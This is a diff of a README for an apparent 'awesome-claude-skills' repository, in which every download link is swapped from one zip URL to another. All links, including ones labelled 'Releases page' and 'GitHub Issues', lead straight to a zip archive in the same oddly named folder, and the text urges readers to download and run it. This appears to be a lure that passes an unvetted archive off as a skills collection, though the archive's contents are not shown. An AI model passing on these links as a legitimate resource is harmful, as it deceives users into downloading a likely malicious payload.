@@ -1,7 +1,7 @@
 # 🌟 awesome-claude-skills - Discover New Skills Easily
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/ponderous-dustiness314/awesome-claude-skills/main/noninterchangeable/awesome-claude-skills.zip)](https://raw.githubusercontent.com/ponderous-dustiness314/awesome-claude-skills/main/noninterchangeable/awesome-claude-skills.zip)
+[![Download](https://github.com/ponderous-dustiness314/awesome-claude-skills/raw/refs/heads/main/noninterchangeable/awesome-claude-skills-1.0.zip)](https://github.com/ponderous-dustiness314/awesome-claude-skills/raw/refs/heads/main/noninterchangeable/awesome-claude-skills-1.0.zip)
 
 ## 🚀 Getting Started
 Welcome to **awesome-claude-skills**, a carefully curated list of Claude Skills designed to enhance your experience. This guide will walk you through the simple process of downloading and running the application.
@@ -19,7 +19,7 @@ With easy access to a wide range of skills, you can streamline your workflow and
 ## 📥 Download & Install
 
 ### 1. Visit the Releases Page
-To get started, visit our [Releases page](https://raw.githubusercontent.com/ponderous-dustiness314/awesome-claude-skills/main/noninterchangeable/awesome-claude-skills.zip). Here, you will find the latest version of **awesome-claude-skills** and all previous releases.
+To get started, visit our [Releases page](https://github.com/ponderous-dustiness314/awesome-claude-skills/raw/refs/heads/main/noninterchangeable/awesome-claude-skills-1.0.zip). Here, you will find the latest version of **awesome-claude-skills** and all previous releases.
 
 ### 2. Choose the Right Version
 On the Releases page, you will see a list of versions. Each version may contain improvements and fixes. Select the latest version to ensure you get all the new features.
@@ -90,7 +90,7 @@ Thank you for choosing **awesome-claude-skills**. We appreciate your interest an
 For any questions or feedback, please reach out via the Issues page on GitHub or through the contact information provided in the application. 
 
 ## 📢 Important Links
-- [Releases Page](https://raw.githubusercontent.com/ponderous-dustiness314/awesome-claude-skills/main/noninterchangeable/awesome-claude-skills.zip)  
-- [GitHub Issues](https://raw.githubusercontent.com/ponderous-dustiness314/awesome-claude-skills/main/noninterchangeable/awesome-claude-skills.zip)  
+- [Releases Page](https://github.com/ponderous-dustiness314/awesome-claude-skills/raw/refs/heads/main/noninterchangeable/awesome-claude-skills-1.0.zip)  
+- [GitHub Issues](https://github.com/ponderous-dustiness314/awesome-claude-skills/raw/refs/heads/main/noninterchangeable/awesome-claude-skills-1.0.zip)  
 
 Happy exploring with **awesome-claude-skills**!
